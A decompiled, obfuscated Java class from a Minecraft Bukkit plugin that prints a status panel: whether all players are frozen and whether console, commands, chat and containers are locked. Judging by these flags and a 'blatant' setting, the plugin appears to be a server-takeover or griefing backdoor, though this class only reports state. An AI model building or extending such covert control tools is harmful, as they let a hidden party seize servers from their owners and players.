/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class StatusCommand
extends Command {
    public StatusCommand() {
        StatusCommand llllllllllllllIIllIlllIIIllIIIlI;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core llllllllllllllIIllIlllIIIlIllIlI, String llllllllllllllIIllIlllIIIlIlllIl, String[] llllllllllllllIIllIlllIIIlIlllII, Player llllllllllllllIIllIlllIIIlIllIIl) {
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage("");
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7All players frozen: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.frozen))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7Console Locked: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.isLocked))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7Mod Commands Locked: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.modCmd))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7Commands Locked: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.playerCommandsLocked))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7Chat Locked: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.chatLocked))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7Containers Locked: ").append(Settings.RED).append(llllllllllllllIIllIlllIIIlIllIlI.storagesDisabled))));
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage("");
        llllllllllllllIIllIlllIIIlIllIIl.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
    }
}

